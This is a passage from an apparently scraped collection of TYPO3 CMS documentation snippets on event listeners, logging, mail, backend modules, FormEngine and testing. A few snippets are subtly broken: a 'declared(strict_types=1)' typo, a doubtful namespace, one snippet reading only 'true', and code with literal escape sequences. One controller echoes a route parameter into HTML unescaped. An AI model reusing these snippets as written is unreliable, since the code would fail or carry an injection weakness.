https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"page-container\">\n    <f:render partial=\"Header\" arguments=\"{_all}\" />\n    <f:render section=\"Main\" />\n    <f:render partial=\"Footer\" arguments=\"{_all}\" />\n</div>\n```\n\n----------------------------------------\n\nTITLE: Example Event Listener for AfterLinkIsGeneratedEvent in TYPO3\nDESCRIPTION: A sample implementation of an event listener that responds to the AfterLinkIsGeneratedEvent. This allows for modifying link attributes in TYPO3's frontend after links are generated through the typolink() functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterLinkIsGeneratedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\Event\\AfterLinkIsGeneratedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterLinkIsGeneratedEvent $event): void\n    {\n        $linkResult = $event->getLinkResult();\n        $attributes = $linkResult->getAttributes();\n        $attributes['data-link-type'] = $linkResult->getType();\n        $linkResult->setAttributes($attributes);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Inline Media to Emails in PHP\nDESCRIPTION: Shows how to embed inline media such as images in an email, including referencing the embedded images in HTML content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_15\n\nLANGUAGE: php\nCODE:\n```\n// Get the image contents from a PHP resource\n$mail->embed(fopen('/path/to/images/logo.png', 'r'), 'logo');\n\n// Get the image contents from an existing file\n$mail->embedFromPath('/path/to/images/signature.png', 'footer-signature');\n\n// reference images using the syntax 'cid:' + \"image embed name\"\n$mail->html('<img src=\"cid:logo\"> ... <img src=\"cid:footer-signature\"> ...');\n```\n\n----------------------------------------\n\nTITLE: Accessing Dynamic URL Parameters in TYPO3 Backend Controller\nDESCRIPTION: Example of a controller class demonstrating how to access dynamic URL parameters that were defined in backend routes. The parameters are retrieved from the request's 'routing' attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace Vendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Core\\Http\\HtmlResponse;\n\nclass MyRouteController\n{\n    public function mainAction(ServerRequestInterface $request): ResponseInterface\n    {\n        // Get the parameters from the request\n        $routingParameters = $request->getAttribute('routing');\n        \n        // The parameter name is the same as in the route path\n        $uid = $routingParameters['uid'];\n        \n        return new HtmlResponse('<p>This is dynamic route: ' . $uid . '</p>');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for ProcessFileListActionsEvent in TYPO3\nDESCRIPTION: Example implementation of an event listener for the ProcessFileListActionsEvent in TYPO3. This listener can modify the icons and actions displayed in the File > Filelist module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Filelist/ProcessFileListActionsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\FileList\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Configuration\\Event\\ProcessFileListActionsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ProcessFileListActionsEvent $event): void\n    {\n        // Your custom logic here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Complex TypoScript COA Configuration\nDESCRIPTION: Demonstrates using Content Object Array (COA) to handle multiple fields from passed objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_7\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.myCounter = COA\nlib.myCounter {\n  10 = TEXT\n  10.field = title\n  20 = TEXT\n  20.field = viewCount\n  wrap = (<strong>|</strong>)\n}\n```\n\n----------------------------------------\n\nTITLE: Logger Injection in TYPO3 Class with LoggerAwareInterface\nDESCRIPTION: Example of injecting a logger into a custom TYPO3 class using LoggerAwareInterface when autowiring is disabled. The class implements the required interface and uses the LoggerAwareTrait.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\MyFolder;\n\nuse Psr\\Log\\LoggerAwareInterface;\nuse Psr\\Log\\LoggerAwareTrait;\n\nclass MyClass implements LoggerAwareInterface\n{\n    use LoggerAwareTrait;\n\n    public function doSomething(): void\n    {\n        // Log something\n        $this->logger->info('The extension did something');\n\n        // Log a warning with additional data\n        $this->logger->warning('Something went wrong', ['error' => 'not found']);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a Third-level Module for Web > Template in TYPO3\nDESCRIPTION: This code snippet demonstrates how to register a custom third-level module for the Web > Template section in TYPO3. It defines the module's parent, access rights, path, icon, labels, routes, and module data. This allows the module to appear as a submenu item under the Template module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/ThirdlevelModules.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'web_ts_customts' => [\n    'parent' => 'web_ts',\n    'access' => 'user',\n    'path' => '/module/web/typoscript/custom-ts',\n    'iconIdentifier' => 'module-custom-ts',\n    'labels' => [\n        'title' => 'LLL:EXT:extkey/Resources/Private/Language/locallang.xlf:mod_title',\n    ],\n    'routes' => [\n        '_default' => [\n            'target' => CustomTsController::class . '::handleRequest',\n        ],\n    ],\n    'moduleData' => [\n        'someOption' => false,\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Mailer Service in TYPO3\nDESCRIPTION: YAML configuration for registering a custom mailer implementation in TYPO3. Defines service alias mapping for the MailerInterface to use a custom mailer class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nTYPO3\\CMS\\Core\\Mail\\MailerInterface:\n    alias: MyVendor\\SitePackage\\Mail\\MyCustomMailer\n```\n\n----------------------------------------\n\nTITLE: Using StringLength Validator with Min/Max Options in PHP\nDESCRIPTION: Example of applying the StringLength validator to ensure a description field is between 5 and 50 characters long.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\n#[Validate([\n    'validator' => 'StringLength',\n    'options' => ['minimum' => 5, 'maximum' => 50],\n])]\nprotected string $description;\n```\n\n----------------------------------------\n\nTITLE: Adding Advanced Flash Message in Extbase Controller (PHP)\nDESCRIPTION: Shows how to add a more complex flash message with custom severity and storage options. This example sets the message severity to OK and prevents it from being stored in the session.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Extbase.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Type\\ContextualFeedbackSeverity;\n\n$this->addFlashMessage(\n   'This message is forced to be NOT stored in the session by setting the fourth argument to FALSE.',\n   'Success',\n   ContextualFeedbackSeverity::OK,\n   false\n);\n```\n\n----------------------------------------\n\nTITLE: Using EntityPersistedEvent in TYPO3 CMS Extbase Persistence\nDESCRIPTION: The EntityPersistedEvent is fired after an Extbase object is pushed to the storage backend. This event can be used to perform actions after an entity has been successfully persisted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Persistence/EntityPersistedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class EntityPersistedEvent\n{\n    private object $entity;\n\n    public function __construct(object $entity)\n    {\n        $this->entity = $entity;\n    }\n\n    public function getEntity(): object\n    {\n        return $this->entity;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using SiteProcessor in FLUIDTEMPLATE\nDESCRIPTION: This snippet demonstrates how to use the SiteProcessor in a FLUIDTEMPLATE content object to fetch data from the site entity. It shows the TypoScript configuration and corresponding Fluid template usage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInTypoScript.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\ntt_content.mycontent.20 = FLUIDTEMPLATE\ntt_content.mycontent.20 {\n    file = EXT:myextension/Resources/Private/Templates/ContentObjects/MyContent.html\n\n    dataProcessing.10 = TYPO3\\CMS\\Frontend\\DataProcessing\\SiteProcessor\n    dataProcessing.10 {\n        as = site\n    }\n}\n```\n\nLANGUAGE: html\nCODE:\n```\n<p>{site.rootPageId}</p>\n<p>{site.configuration.someCustomConfiguration}</p>\n```\n\nLANGUAGE: html\nCODE:\n```\n<p>{site.configuration.settings.mySettingKey}</p>\n<p>{site.settings.all.mySettingKey}</p>\n```\n\n----------------------------------------\n\nTITLE: Using Fluid Debug ViewHelper to Inspect Variables in Templates\nDESCRIPTION: Example of using Fluid's debug ViewHelper to output the value of a variable in a template. This generates an HTML dump of the variable content for inspection during development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Debugging/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<f:debug>{myVariable}</f:debug>\n```\n\n----------------------------------------\n\nTITLE: Implementing a Container in FormEngine Rendering for TYPO3 CMS in PHP\nDESCRIPTION: Example of a container class implementation for the FormEngine rendering process. It demonstrates how to initialize a result array, fetch sub-container results via NodeFactory, and merge child results with the container's own output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Containers;\n\nuse TYPO3\\CMS\\Backend\\Form\\Container\\AbstractContainer;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Backend\\Form\\NodeFactory;\n\nclass SomeContainer extends AbstractContainer\n{\n    public function render(): array\n    {\n        $result = $this->initializeResultArray();\n        \n        // Get some variable from data array that was prepared by FormDataCompiler\n        $someData = $this->data['someData'];\n        \n        // Calculate something\n        $someLabel = 'foobar';\n        \n        // Prepare the container HTML and set it in the result\n        $result['html'] = '<div class=\"someFancyClass\">' . htmlspecialchars($someLabel) . '</div>';\n        \n        // Create an instance of NodeFactory to resolve a sub-container or element\n        $nodeFactory = GeneralUtility::makeInstance(NodeFactory::class);\n        \n        // Hand over data array to sub container, just add renderType = subContainer here, so the registry\n        // in NodeFactory can find the class responsible for this renderType.\n        $this->data['renderType'] = 'subContainer';\n        \n        // Call sub-container, get result back, this calls render() on our sub container or element\n        $childArray = $nodeFactory->create($this->data)->render();\n        \n        // Add sub-container HTML at specific position in HTML\n        $result['html'] = str_replace('###CHILD_HTML###', $childArray['html'], $result['html']);\n        \n        // Merge additional sub-container results like required JavaScript and CSS\n        $result = $this->mergeChildReturnIntoExistingResult($result, $childArray);\n        \n        return $result;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring FileWriter in TYPO3\nDESCRIPTION: Configuration for the FileWriter in TYPO3, showing how to set up logging for a specific component to write logs to a custom log file with a specified path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['T3docs']['Examples']['Controller']['writerConfiguration'] = [\n    // configuration for WARNING severity, including all\n    // levels with higher severity (ERROR, CRITICAL, EMERGENCY)\n    \\TYPO3\\CMS\\Core\\Log\\LogLevel::WARNING => [\n        // add a FileWriter\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class => [\n            // configuration for the writer\n            'logFile' => 'typo3temp/logs/examples.log'\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Basic DataHandler Commands in PHP\nDESCRIPTION: Examples showing basic DataHandler commands for deleting, copying and moving content elements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$cmd['tt_content'][54]['delete'] = 1;    // Deletes tt_content record with uid=54\n$cmd['tt_content'][1203]['copy'] = -303; // Copies tt_content uid=1203 to the position after tt_content uid=303\n$cmd['tt_content'][1203]['copy'] = 400;  // Copies tt_content uid=1203 to first position in page uid=400\n$cmd['tt_content'][1203]['move'] = 400;  // Moves tt_content uid=1203 to the first position in page uid=400\n```\n\n----------------------------------------\n\nTITLE: Installing Make Extension via DDEV\nDESCRIPTION: Command to install the Make extension as a dev dependency using DDEV in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nddev composer req b13/make --dev\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Storage in TYPO3 FAL - PHP\nDESCRIPTION: Example demonstrating how to retrieve a specific storage object using StorageRepository class by providing the storage UID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesStorageRepository.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Resource;\n\nuse TYPO3\\CMS\\Core\\Resource\\StorageRepository;\n\nclass GetStorageObjectExample\n{\n    protected StorageRepository $storageRepository;\n\n    public function __construct(StorageRepository $storageRepository)\n    {\n        $this->storageRepository = $storageRepository;\n    }\n\n    public function getStorageObject(): void\n    {\n        $storage = $this->storageRepository->findByUid(1);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Backend Module Template HTML with Fluid\nDESCRIPTION: HTML template example for a TYPO3 backend module. It demonstrates a basic structure with container elements and how to output variables passed from the controller. Note that some Fluid tags like f:form do not work in non-Extbase context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<h1>Backend Module</h1>\n\n<p>This demonstrates a plain controller.</p>\n\n<div class=\"alert alert-info\">\n    <div class=\"media\">\n        <div class=\"media-left\">\n            <span class=\"fa-stack fa-lg\">\n                <i class=\"fa fa-circle fa-stack-2x\"></i>\n                <i class=\"fa fa-info fa-stack-1x\"></i>\n            </span>\n        </div>\n        <div class=\"media-body\">\n            <p>\n                Some variables:\n            </p>\n            <ul>\n                <li>someVar: {someVar}</li>\n                <li>anotherVar: {anotherVar}</li>\n            </ul>\n        </div>\n    </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Registering Service Defaults in TYPO3\nDESCRIPTION: YAML configuration for setting up default service behavior with autoconfigure enabled for automatic context menu item registration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n```\n\n----------------------------------------\n\nTITLE: Adding Basic Canonical URL Parameters in TYPO3\nDESCRIPTION: Demonstrates how to configure additional arguments for canonical URL generation in TYPO3's global configuration. This example shows adding a single argument to be included in canonical URLs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/CanonicalApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['additionalCanonicalizedUrlParameters'][] = 'example_argument_name';\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class in TYPO3 CMS Blog Example (PHP)\nDESCRIPTION: This code snippet defines the Post class for a blog example in TYPO3 CMS. It extends AbstractEntity and implements the Stringable interface. The class includes an optional 1:1 relation to an Info object, with corresponding getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/Optional1on1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Post extends AbstractEntity implements \\Stringable\n{\n    /**\n     * 1:1 optional relation\n     */\n    protected ?Info $additionalInfo = null;\n\n    public function getAdditionalInfo(): ?Info\n    {\n        return $this->additionalInfo;\n    }\n\n    public function setAdditionalInfo(?Info $additionalInfo): void\n    {\n        $this->additionalInfo = $additionalInfo;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Current Content Object in TYPO3 Extbase Controller\nDESCRIPTION: This PHP code snippet demonstrates how to access the current content object from the Extbase request object in a TYPO3 controller. It retrieves the ContentObjectRenderer instance and extracts the UID of the current tt_content record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/CurrentContentObject.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n/**\n * @var \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer $currentContentObject\n */\n$currentContentObject = $request->getAttribute('currentContentObject');\n// ID of current tt_content record\n$uid = $currentContentObject->data['uid'];\n```\n\n----------------------------------------\n\nTITLE: Preparing Frontend Test in PHP for TYPO3\nDESCRIPTION: Shows how to prepare a frontend test by loading TypoScript files and executing a frontend request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nprotected array $pathsToLinkInTestInstance = [\n    'typo3/sysext/frontend/Tests/Functional/Fixtures/TypoScript/' => 'fileadmin/frontend-setup/',\n];\nprotected function setUp(): void\n{\n    parent::setUp();\n    $this->setUpFrontendRootPage(\n        1,\n        [\n            'typo3/sysext/frontend/Tests/Functional/Fixtures/TypoScript/Basic.typoscript',\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring MemoryPeakUsageProcessor in TYPO3\nDESCRIPTION: Configuration options for MemoryPeakUsageProcessor including realMemoryUsage and formatSize parameters that control how peak memory usage is measured and displayed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Processors/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\ntrue\n```\n\n----------------------------------------\n\nTITLE: Implementing Show Action in TYPO3 Extbase Controller\nDESCRIPTION: Implementation of a show action in a TYPO3 Extbase controller that displays details of a specific tea object. It receives a Tea model object as a parameter and passes it to the view for rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Controller.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\npublic function showAction(Tea $tea): ResponseInterface\n{\n    $this->view->assign('tea', $tea);\n    return $this->htmlResponse();\n}\n```\n\n----------------------------------------\n\nTITLE: Throwing and Catching File Exceptions in PHP\nDESCRIPTION: Demonstrates throwing various exceptions when dealing with files. Includes handling of file-not-found and file-access errors, with specific exception classes to provide clarity in error messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/WorkingWithExceptions.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nuse MyVendor\\\\SomeExtension\\\\File\\\\FileNotAccessibleException;\\nuse MyVendor\\\\SomeExtension\\\\File\\\\FileNotFoundException;\\n\\n// ...\\n\\nif (\\$pid === 0) {\\n    throw new \\\\RuntimeException('The page \\\"' . \\$pid . '\\\" cannot be accessed.', 1548145665);\\n}\\n\\n\\$absoluteFilePath = GeneralUtility::getFileAbsFileName(\\$filePath);\\n\\nif (is_file(\\$absoluteFilePath)) {\\n    \\$file = fopen(\\$absoluteFilePath, 'rb');\\n} else {\\n    // prefer speaking exception names, add custom exceptions if necessary\\n    throw new FileNotFoundException('File \\\"' . \\$absoluteFilePath . '\\\" does not exist.', 1548145672);\\n}\\n\\nif (\\$file == null) {\\n    throw new FileNotAccessibleException('File \\\"' . \\$absoluteFilePath . '\\\" cannot be read.', 1548145672);\\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Custom RenderType in TCA Configuration for TYPO3 CMS in PHP\nDESCRIPTION: Shows how to apply a custom renderType to a specific TCA field. This preserves database functionality but changes how the field is rendered in the backend interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\n// Configure a field to use the new renderType in TCA\n$GLOBALS['TCA']['tx_cooltagcloud']['columns']['tags']['config']['renderType'] = 'coolTagCloud';\n```\n\n----------------------------------------\n\nTITLE: Removing Specific Restrictions by Type in TYPO3\nDESCRIPTION: Demonstrates how to selectively remove specific restrictions by their type rather than removing all restrictions. This example removes StartTimeRestriction and EndTimeRestriction while keeping other restrictions like hidden and deleted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n// use TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n// use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\StartTimeRestriction\n// use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\EndTimeRestriction\n// Remove starttime and endtime, but keep hidden and deleted\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->getRestrictions()\n    ->removeByType(StartTimeRestriction::class)\n    ->removeByType(EndTimeRestriction::class);\n```\n\n----------------------------------------\n\nTITLE: Implementing a ModifyFileDumpEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for ModifyFileDumpEvent that performs additional access checks before allowing a file to be dumped. The listener can reject requests by setting a 403 response or replace the file to be dumped.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/ModifyFileDumpEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Resource\\EventListener;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Http\\Response;\nuse TYPO3\\CMS\\Core\\Resource\\Event\\ModifyFileDumpEvent;\nuse TYPO3\\CMS\\Core\\Resource\\File;\n\n/**\n * Implement custom access restriction on file downloads\n */\nclass MyEventListener\n{\n    public function __invoke(ModifyFileDumpEvent $event): void\n    {\n        $file = $event->getFile();\n\n        // Check access, for example based on properties stored in sys_file_metadata\n        if ($this->isAccessDenied($file)) {\n            // Return 403 Response to deny access\n            $response = new Response();\n            $response = $response->withStatus(403);\n            $event->setResponse($response);\n            return;\n        }\n\n        // It's also possible to replace the file\n        // For example, deliver a preview image, based on user access rights\n        if ($this->shouldProvideAlternativeFile($file)) {\n            $alternativeFile = $this->getAlternativeFile($file);\n            if ($alternativeFile instanceof File) {\n                $event->setFile($alternativeFile);\n            }\n        }\n    }\n\n    protected function isAccessDenied(File $file): bool\n    {\n        // Implement your access control logic here\n        return false;\n    }\n\n    protected function shouldProvideAlternativeFile(File $file): bool\n    {\n        // Implement your logic here\n        return false;\n    }\n\n    protected function getAlternativeFile(File $file): ?File\n    {\n        // Implement your logic here\n        return null;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating SQL Database Schema for TYPO3 Extension\nDESCRIPTION: This SQL code demonstrates how to define a database table for a TYPO3 extension. The example creates a table named 'tx_exampleextension_domain_model_example' with three fields: 'title', 'description', and 'foo_foo', each with appropriate data types and default values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/ComponentsOfTYPO3Extension/CreatingDatabaseModel.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tx_exampleextension_domain_model_example (\n    title       varchar(255)     DEFAULT ''  NOT NULL,\n    description text             DEFAULT '',\n    foo_foo     tinyint(1)       DEFAULT '1'\n);\n```\n\n----------------------------------------\n\nTITLE: URI Builder in Fluid ViewHelper\nDESCRIPTION: This snippet demonstrates how to use the URI builder within a Fluid ViewHelper. It shows how to retrieve the request context. It's important to call `parent::__construct()` if extending `AbstractTagBasedViewHelper` or use dependency injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/UriBuilder.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n\"<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\\\MyExtension\\\\ViewHelpers;\n\nuse TYPO3\\\\CMS\\\\Core\\\\Utility\\\\GeneralUtility;\nuse TYPO3\\\\CMS\\\\Extbase\\\\Mvc\\\\Web\\\\Routing\\\\UriBuilder;\nuse TYPO3Fluid\\\\Fluid\\\\Core\\\\ViewHelper\\\\AbstractViewHelper;\n\nclass MyLinkViewHelper extends AbstractViewHelper\n{\n    /**\n     * Initialize arguments\n     * @return void\n     */\n    public function initializeArguments(): void\n    {\n        $this->registerArgument('configuration', 'array', 'Configuration array');\n    }\n\n    /**\n     * Render method\n     * @return string\n     */\n    public function render(): string\n    {\n        $configuration = $this->arguments['configuration'];\n        /** @var UriBuilder $uriBuilder */\n        $uriBuilder = GeneralUtility::makeInstance(UriBuilder::class);\n        $uriBuilder->setRequest($this->request);\n        $uriBuilder->reset();\n        $uriBuilder->setArguments($configuration);\n        return $uriBuilder->build();\n    }\n}\n\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Extbase Frontend Plugin using TypoScript\nDESCRIPTION: This PHP code snippet outlines the configuration of an Extbase frontend plugin to be used as TypoScript. It demonstrates usage of `TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::configurePlugin()` to define controllers and actions in the context of a TypoScript plugin intended for displaying posts as an RSS feed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FrontendPlugins.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n\\TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::configurePlugin(\n  'blog_example',\n  'PostListRss',\n  [\n    'Post' => 'list'\n  ],\n  // Non-cacheable actions\n  []\n);\n```\n\n----------------------------------------\n\nTITLE: Example System Under Test: ArrayUtility in PHP\nDESCRIPTION: Demonstrates a basic utility class in TYPO3 that will be used for unit testing. Shows a simple array manipulation method for testing purposes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass ArrayUtility {\n    public static function trimExplode($delimiter, $string, $removeEmptyValues = false) {\n        $explodedValues = explode($delimiter, $string);\n        $result = array_map('trim', $explodedValues);\n        \n        if ($removeEmptyValues) {\n            $result = array_filter($result);\n        }\n        \n        return $result;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeRequestTokenProcessedEvent Class in PHP for TYPO3 CMS Core Authentication\nDESCRIPTION: This snippet defines the BeforeRequestTokenProcessedEvent class with methods to get and set various properties related to user authentication and request processing in TYPO3 CMS. It includes methods to retrieve the user, request, request token, and to set the request token.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeRequestTokenProcessedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Authentication\\Event;\n\nclass BeforeRequestTokenProcessedEvent\n{\n    public function getUser(): 